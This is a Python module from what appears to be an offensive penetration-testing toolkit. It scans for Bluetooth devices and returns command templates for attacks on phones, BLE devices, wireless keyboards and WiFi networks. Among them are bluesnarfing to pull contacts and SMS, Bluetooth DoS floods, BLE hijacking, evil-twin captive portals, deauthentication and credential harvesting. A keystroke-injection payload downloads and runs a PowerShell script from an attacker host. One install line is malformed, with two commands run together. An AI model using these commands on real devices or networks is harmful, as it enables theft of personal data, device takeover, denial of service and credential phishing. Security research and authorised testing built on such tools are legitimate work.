#!/usr/bin/env python3
"""
NexusPen - Bluetooth Attacks Module
=====================================
Bluetooth security testing.
"""

import subprocess
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class BluetoothDevice:
    """Discovered Bluetooth device."""
    address: str
    name: str
    device_class: str
    rssi: int
    services: List[str]


class BluetoothScanner:
    """
    Bluetooth device scanner.
    """
    
    def __init__(self, interface: str = 'hci0'):
        self.interface = interface
        self.devices: List[BluetoothDevice] = []
    
    def enable_interface(self) -> bool:
        """Enable Bluetooth interface."""
        try:
            subprocess.run(['hciconfig', self.interface, 'up'], capture_output=True)
            return True
        except:
            return False
    
    def scan_devices(self, duration: int = 10) -> List[BluetoothDevice]:
        """Scan for Bluetooth devices."""
        console.print(f"\n[cyan]📶 Scanning Bluetooth devices for {duration}s...[/cyan]")
        
        devices = []
        
        try:
            # Using hcitool
            result = subprocess.run(
                ['hcitool', 'scan', '--length', str(duration)],
                capture_output=True, text=True, timeout=duration + 10
            )
            
            for line in result.stdout.split('\n'):
                if ':' in line and 'Scanning' not in line:
                    parts = line.strip().split('\t')
                    if len(parts) >= 2:
                        device = BluetoothDevice(
                            address=parts[0].strip(),
                            name=parts[1].strip() if len(parts) > 1 else 'Unknown',
                            device_class='Unknown',
                            rssi=0,
                            services=[]
                        )
                        devices.append(device)
                        console.print(f"[green]  ✓ {device.address} - {device.name}[/green]")
                        
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        self.devices = devices
        return devices
    
    def scan_ble(self, duration: int = 10) -> str:
        """Scan for BLE devices."""
        console.print("\n[cyan]📶 Scanning BLE devices...[/cyan]")
        
        return f'''
# BLE Scanning

# Using hcitool
sudo hcitool lescan --duplicates

# Using bluetoothctl
bluetoothctl
> scan on
> scan off
> devices

# Using bettercap
sudo bettercap
> ble.recon on

# Using hcxdumptool (captures BLE)
hcxdumptool -i {self.interface} -o ble_capture.pcapng --enable_status=1

# Python with bleak
pip install bleak
python -c "import asyncio; from bleak import BleakScanner; print(asyncio.run(BleakScanner.discover()))"
'''
    
    def get_device_info(self, address: str) -> str:
        """Get detailed device info."""
        console.print(f"\n[cyan]ℹ️ Getting info for {address}...[/cyan]")
        
        try:
            # Get device class and services
            result = subprocess.run(
                ['hcitool', 'info', address],
                capture_output=True, text=True, timeout=30
            )
            return result.stdout
            
        except Exception as e:
            return f"Error: {e}"
    
    def enumerate_services(self, address: str) -> str:
        """Enumerate Bluetooth services (SDP)."""
        console.print(f"\n[cyan]🔍 Enumerating services on {address}...[/cyan]")
        
        try:
            result = subprocess.run(
                ['sdptool', 'browse', address],
                capture_output=True, text=True, timeout=60
            )
            console.print(result.stdout)
            return result.stdout
            
        except Exception as e:
            return f"Error: {e}"


class BluetoothAttacks:
    """
    Bluetooth attack techniques.
    """
    
    @staticmethod
    def bluejacking(address: str, message: str = "You've been bluejacked!") -> str:
        """Bluejacking - send unsolicited messages."""
        return f'''
# Bluejacking Attack (send messages via OBEX Push)

# Using ussp-push
ussp-push {address}@9 message.txt /tmp/message.txt

# Using obexftp
echo "{message}" > /tmp/message.txt
obexftp --noconn --uuid none --bluetooth {address} --channel 9 -p /tmp/message.txt

# Using l2ping (DoS variant)
l2ping -i hci0 -s 600 -f {address}
'''
    
    @staticmethod
    def bluesnarfing(address: str) -> str:
        """Bluesnarfing - unauthorized data access."""
        return f'''
# Bluesnarfing Attack
# Exploit OBEX Push vulnerability to access data

# Download phonebook
obexftp --bluetooth {address} --channel 10 -g telecom/pb.vcf

# Download calendar
obexftp --bluetooth {address} --channel 10 -g telecom/cal.vcs

# Download messages
obexftp --bluetooth {address} --channel 10 -g telecom/ich.vcf

# Using bluesnarfer
bluesnarfer -b {address} -r 1-100  # Read phonebook entries
bluesnarfer -b {address} -s 1      # Read SMS
bluesnarfer -b {address} -C        # Get call list
bluesnarfer -b {address} -i        # Get device info
'''
    
    @staticmethod
    def bluebugging(address: str) -> str:
        """Bluebugging - take control of device."""
        return f'''
# Bluebugging Attack
# Full control over vulnerable device

# Connect via RFCOMM
rfcomm connect hci0 {address} 1

# AT commands (if serial profile available)
# Make call: ATD+1234567890
# Send SMS: AT+CMGS="number"
# Answer call: ATA
# Hang up: ATH

# Using Bluebugger tool (if available)
bluebugger -a {address}
'''
    
    @staticmethod
    def btcrack(address: str, cap_file: str) -> str:
        """Crack Bluetooth PIN."""
        return f'''
# Bluetooth PIN Cracking

# Capture pairing (requires special hardware/setup)
btlejack -c {address}

# Crack captured PIN
btcrack {cap_file}

# Brute force common PINs
# 0000, 1234, 1111, etc.

# Using crackle for BLE
crackle -i ble_capture.pcap -o decrypted.pcap
'''
    
    @staticmethod
    def bdaddr_spoofing(new_address: str) -> str:
        """Spoof Bluetooth address."""
        return f'''
# Bluetooth Address Spoofing

# Using bdaddr
bdaddr -i hci0 {new_address}

# Using spooftooph
spooftooph -i hci0 -a {new_address}

# Manual with hciconfig
hciconfig hci0 down
bdaddr -i hci0 {new_address}
hciconfig hci0 up

# Verify
hciconfig hci0 | grep Address
'''
    
    @staticmethod
    def bluetooth_dos(address: str) -> str:
        """Bluetooth DoS attacks."""
        return f'''
# Bluetooth DoS Attacks

# L2CAP ping flood
l2ping -i hci0 -s 600 -f {address}

# Using Bluesmack
bluesmack {address}

# Bluetooth crash (CVE-specific)
# Some devices crash on malformed packets

# BLE DoS
# Send malformed advertisements
'''


class BLEAttacks:
    """
    Bluetooth Low Energy attacks.
    """
    
    @staticmethod
    def ble_sniffing() -> str:
        """Sniff BLE traffic."""
        return '''
# BLE Sniffing

# Using Ubertooth
ubertooth-btle -f

# Using nRF Sniffer + Wireshark
# Install nRF Sniffer plugin for Wireshark

# Using btlejack
btlejack -c ff:ff:ff:ff:ff:ff  # Sniff all

# Using bettercap
bettercap
> ble.recon on
> ble.show
> ble.enum [MAC]
'''
    
    @staticmethod
    def ble_hijacking(address: str) -> str:
        """BLE connection hijacking."""
        return f'''
# BLE Connection Hijacking

# Using btlejack
btlejack -f {address}  # Follow device
btlejack -c {address}  # Sniff connection
btlejack -x  # Hijack connection

# Steps:
# 1. Identify target connection
# 2. Sniff to get access address and CRC init
# 3. Jam and inject packets
'''
    
    @staticmethod
    def gattacker() -> str:
        """GATTacker MitM attack."""
        return '''
# GATTacker - BLE MitM Framework

# Install
git clone https://github.com/securing/gattacker.git
cd gattacker
npm install

# Scan for devices
node scan.js

# Clone device (advertising)
node advertise.js -a devices/xx-xx-xx-xx-xx-xx.adv.json

# MitM proxy
node proxy.js -t TARGET_MAC -a CLONED_ADV

# Modify GATT responses in ws-slave.js callbacks
'''
    
    @staticmethod
    def ble_write_attack(address: str, handle: str, value: str) -> str:
        """Write to BLE characteristic."""
        return f'''
# BLE Write Attack

# Using gatttool
gatttool -b {address} --char-write-req -a {handle} -n {value}

# Interactive mode
gatttool -b {address} -I
> connect
> char-desc
> char-write-req {handle} {value}

# Using bettercap
bettercap -eval "ble.recon on; ble.write {address} {handle} {value}"
'''
    
    @staticmethod
    def crackle_attack() -> str:
        """Crack BLE encryption with crackle."""
        return '''
# Crackle - Exploit BLE Legacy Pairing

# Capture BLE pairing exchange with Ubertooth or similar
ubertooth-btle -f -c capture.pcap

# Run crackle to get TK (Temporary Key)
crackle -i capture.pcap

# Decrypt with recovered key
crackle -i capture.pcap -o decrypted.pcap -l [TK]

# Works on Legacy Pairing (not Secure Connections)
'''


class MouseJack:
    """
    MouseJack wireless keyboard/mouse attacks.
    """
    
    @staticmethod
    def scan_devices() -> str:
        """Scan for vulnerable devices."""
        return '''
# MouseJack Scanning
# Requires CrazyRadio PA

# Install JackIt
pip install jackitgit clone https://github.com/insecurityofthings/jackit.git

# Scan for devices
jackit --scan

# Or using mousejack tools
git clone https://github.com/BastilleResearch/mousejack.git
cd mousejack/tools
./nrf24-scanner.py -c 1-100
'''
    
    @staticmethod
    def inject_keystrokes(address: str, payload: str = 'calc.exe') -> str:
        """Inject keystrokes."""
        return f'''
# MouseJack Keystroke Injection

# Using JackIt
jackit --address {address} --vendor logitech --attack ducky
# Enter DuckyScript commands

# Using LOGITacker
# Flash LOGITacker firmware to nRF52840
./logitacker.py -i inject -t {address} -p {payload}

# Ducky Script example:
STRING powershell -ep bypass
ENTER
STRING IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')
ENTER
'''
    
    @staticmethod
    def bypass_encryption() -> str:
        """Exploit unencrypted communication."""
        return '''
# Many wireless keyboards have weak/no encryption

# Affected vendors:
# - Logitech (some models)
# - Dell
# - Microsoft (some models)
# - HP
# - Lenovo

# Attack vectors:
# 1. Unencrypted HID reports
# 2. Weak encryption (XOR)
# 3. Key reuse
# 4. Missing authentication
'''


class WiFiPineapple:
    """
    WiFi Pineapple-style attacks.
    """
    
    @staticmethod
    def setup_pineapple() -> str:
        """Setup commands for Pineapple-like attacks."""
        return '''
# WiFi Pineapple Style Attacks on Linux

# 1. PineAP (respond to all probes)
# Use hostapd with KARMA patch

# 2. Evil Portal
wifiphisher -i wlan0

# 3. Deauth attacks
aireplay-ng --deauth 0 -a [AP_MAC] wlan0mon

# 4. SSL Strip
mitmproxy --mode transparent --ssl-insecure

# 5. DNS Spoofing
bettercap
> dns.spoof on

# 6. Credential harvesting
# Use responder
responder -I wlan0 -wrf

# 7. Captive portal
# nginx + php + credential logging
'''
    
    @staticmethod
    def fluxion() -> str:
        """Fluxion-style attack."""
        return '''
# Fluxion - Automated WPA social engineering

# Install
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
./fluxion.sh

# Steps:
# 1. Scan for targets
# 2. Capture handshake
# 3. Create evil twin
# 4. Host fake captive portal
# 5. Victim enters WiFi password
# 6. Verify against captured handshake
# 7. Profit!

# Manual equivalent:
# 1. airodump-ng scan
# 2. aireplay-ng deauth + capture handshake
# 3. hostapd evil twin (same SSID)
# 4. dnsmasq DHCP + captive portal
# 5. PHP credential catcher
'''
